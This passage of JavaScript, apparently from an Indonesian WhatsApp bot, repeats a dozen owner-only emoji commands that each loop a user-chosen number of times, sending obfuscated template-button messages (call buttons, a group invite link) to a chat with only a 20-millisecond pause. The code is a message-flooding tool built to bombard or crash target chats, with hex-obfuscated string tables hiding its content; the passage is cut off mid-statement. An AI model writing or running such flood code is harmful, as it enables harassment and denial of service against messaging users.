haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
  await sleep(10000* secon)
}
}
break
//=================================================//
case '🌷':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '👄':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🥝':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '💎':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍍':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍌':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍇':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🫐':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🫒':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍐':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍏':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🍈':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await 